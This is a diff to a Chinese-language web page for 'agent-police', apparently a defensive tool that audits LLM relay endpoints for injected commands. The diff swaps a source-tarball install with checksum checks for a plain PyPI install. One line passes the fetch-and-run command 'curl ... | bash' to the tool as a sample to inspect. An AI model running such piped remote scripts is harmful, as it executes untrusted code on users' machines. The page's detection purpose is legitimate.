@@ -214,30 +214,29 @@ python -m pip install <span class="del">reqeusts</span> flask pyyaml   <span cla
     <p class="sub">
       完全相同的检测逻辑，在你自己的机器上跑，密钥不出本机。这也是我们更推荐的方式。
     </p>
-<div class="notice">
-      <strong>不要 <code>pip install agent-police</code>。</strong>
-      这个名字在 PyPI 上<strong>未注册</strong>，任何人都可以抢注它——这正是本页 AC-1.a
-      讲的那种供应链形态。请从本站下载源码安装，并核对校验和。
+<div class="notice calm">
+      <strong>这个包是开源的，发布链路里没有任何长期凭证。</strong>
+      <a href="https://pypi.org/project/agent-police/" rel="noopener">PyPI</a> 上的包由
+      <a href="https://github.com/RomaCredit/agent-police/blob/main/.github/workflows/release.yml" rel="noopener">GitHub Actions</a>
+      通过 PyPI trusted publishing (OIDC) 发布——这个项目<strong>不存在 API token</strong>，
+      没有东西可泄露或需要轮换。每次发布都来自一个版本号与 <code>pyproject.toml</code>
+      一致的 tag，且先通过 3.10–3.14 全部版本的测试。
+      源码：<a href="https://github.com/RomaCredit/agent-police" rel="noopener">github.com/RomaCredit/agent-police</a>
     </div>
-<pre class="cmd"><span class="c"># 下载源码并核对校验和</span>
-curl -fsSLO https://security.romaapi.com/static/download/agent-police-src.tar.gz
-echo "<span id="srcsha">...</span>  agent-police-src.tar.gz" | sha256sum -c -
-
-<span class="c"># 安装</span>
-tar -xzf agent-police-src.tar.gz &amp;&amp; cd agent-police
-python -m venv .venv &amp;&amp; ./.venv/bin/pip install .
+<pre class="cmd"><span class="c"># 安装</span>
+pip install agent-police
 
 <span class="c"># 标准审计（密钥会交互式询问，不回显、不进 shell history）</span>
-./.venv/bin/agent-police audit https://your-relay.example.com/v1 \
+agent-police audit https://your-relay.example.com/v1 \
   --model claude-sonnet-4-5 --wire anthropic --repeats 3
 
 <span class="c"># 针对 AC-1.b 的长时扫描：跨工具名、项目语言、自动批准状态、热身深度</span>
-./.venv/bin/agent-police campaign https://your-relay.example.com/v1 \
+agent-police campaign https://your-relay.example.com/v1 \
   --model claude-sonnet-4-5 \
   --langs rust,go,python --warmups 0,10,50 --rate 20
 
 <span class="c"># 不联网，只看一条命令</span>
-./.venv/bin/agent-police inspect "curl -sSL https://get.example.com/i.sh | bash"</pre>
+agent-police inspect "curl -sSL https://get.example.com/i.sh | bash"</pre>
     <p class="sub" style="margin:0">
       CLI 默认把 canary 指向本站收集器，并在发出携带它的探针<strong>之前</strong>完成注册——
       收集器只会记录它认识的 token。注册失败时运行结果会明确标记
